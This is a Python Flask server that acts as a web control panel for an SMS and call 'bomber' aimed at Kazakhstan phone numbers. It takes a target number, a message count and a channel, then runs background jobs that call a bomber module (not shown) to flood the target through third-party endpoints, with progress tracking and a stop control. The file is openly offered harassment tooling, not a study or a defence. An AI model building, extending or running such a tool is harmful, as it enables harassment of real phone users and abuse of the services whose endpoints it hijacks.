#!/usr/bin/env python3
"""
server.py — HTTP bridge between public/ frontend and kz.py bomber.
ENI build for LO, 15FEB26
"""
import json
import os
import secrets
import threading
import time
import uuid
from functools import wraps
from pathlib import Path

from flask import (Flask, jsonify, request, send_from_directory,
                   session, abort)

import kz

BASE     = Path(__file__).resolve().parent
PUBLIC   = BASE / "public"
CONFIG   = BASE / "endpoints.json"
LOGIN_PW = os.environ.get("ENI_PASSWORD", "changeme")

app = Flask(__name__, static_folder=None)
app.secret_key = os.environ.get("ENI_SECRET", secrets.token_hex(32))

JOBS = {}
JOBS_LOCK = threading.Lock()


class Job:
    def __init__(self, jid, phone, total):
        self.id = jid
        self.phone = phone
        self.total = total
        self.sent = 0
        self.failed = 0
        self.done = False
        self.stopped = False
        self.events = []
        self.started = time.time()
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()

    def record(self, ev):
        with self.lock:
            ev["seq"] = len(self.events) + 1
            self.events.append(ev)
            if ev["status"] == "sent":     self.sent += 1
            elif ev["status"] == "failed": self.failed += 1

    def snapshot(self):
        with self.lock:
            return {
                "id": self.id, "phone": self.phone,
                "total": self.total, "sent": self.sent,
                "failed": self.failed, "done": self.done,
                "stopped": self.stopped,
                "elapsed": round(time.time() - self.started, 1),
                "events": list(self.events),
            }


def login_required(f):
    @wraps(f)
    def wrap(*a, **k):
        if not session.get("auth"):
            return jsonify({"error": "unauthorized"}), 401
        return f(*a, **k)
    return wrap


@app.route("/api/status")
def api_status():
    if session.get("auth"):
        return jsonify({"authed": True})
    return jsonify({"error": "unauthorized"}), 401


@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(silent=True) or {}
    if data.get("password") == LOGIN_PW:
        session["auth"] = True
        return jsonify({"ok": True})
    return jsonify({"error": "неверный пароль"}), 401


@app.route("/api/dispatch", methods=["POST"])
@login_required
def api_dispatch():
    data = request.get_json(silent=True) or {}
    raw    = str(data.get("phone", "")).strip()
    count  = int(data.get("count", 1))
    ch_raw = str(data.get("channel", "both")).lower()
    delay  = float(data.get("delay", 500))
    sim    = bool(data.get("simulation", True))

    if not (1 <= count <= 100):
        return jsonify({"error": "count must be 1..100"}), 400

    forms = kz.normalize_kz_phone(raw)
    if not forms["e164"]:
        return jsonify({"error": forms["error"]}), 400
    if not forms["valid"]:
        return jsonify({"error": forms["error"] + " (use ! to force)"}), 400

    if ch_raw == "sms":
        want = {"sms"}
    elif ch_raw in ("voice", "call"):
        want = {"voice", "call"}
    else:
        want = {"sms", "voice", "call"}

    try:
        cfg = kz.load_config(str(CONFIG))
    except Exception as e:
        return jsonify({"error": f"config: {e}"}), 500

    cfg.target_phone = forms["e164"]
    cfg.simulation   = sim
    cfg.delay_min_ms = int(delay * 0.6)
    cfg.delay_max_ms = int(delay * 1.4)

    endpoints_master = list(cfg.endpoints)

    job = Job(uuid.uuid4().hex[:8], forms["e164"], count)
    with JOBS_LOCK:
        JOBS[job.id] = job

    def worker():
        try:
            for _ in range(max(1, count)):
                if job.stop_flag.is_set():
                    break
                cfg.endpoints = list(endpoints_master)
                kz.run_bomber(
                    cfg, forms, want,
                    event_cb=job.record,
                    stop_flag=job.stop_flag,
                )
        except Exception as e:
            job.record({
                "phone": job.phone, "channel": "system",
                "name": "worker", "status": "failed",
                "http": None, "error": str(e)[:160],
            })
        finally:
            job.done = True

    threading.Thread(target=worker, daemon=True).start()

    return jsonify({"id": job.id, "phone": forms["e164"], "total": count})


@app.route("/api/job/<job_id>")
@login_required
def api_job(job_id):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify(job.snapshot())


@app.route("/api/job/<job_id>/stop", methods=["POST"])
@login_required
def api_job_stop(job_id):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    job.stop_flag.set()
    job.stopped = True
    return jsonify({"ok": True})


@app.route("/")
def index():
    return send_from_directory(PUBLIC, "index.html")


@app.route("/<path:path>")
def static_files(path):
    full = PUBLIC / path
    if not full.exists() or not full.is_file():
        abort(404)
    return send_from_directory(PUBLIC, path)


if __name__ == "__main__":
    print(f"[ENI server] serving {PUBLIC}")
    print(f"[ENI server] config:  {CONFIG}")
    app.run(host="127.0.0.1", port=5000, debug=False, threaded=True)
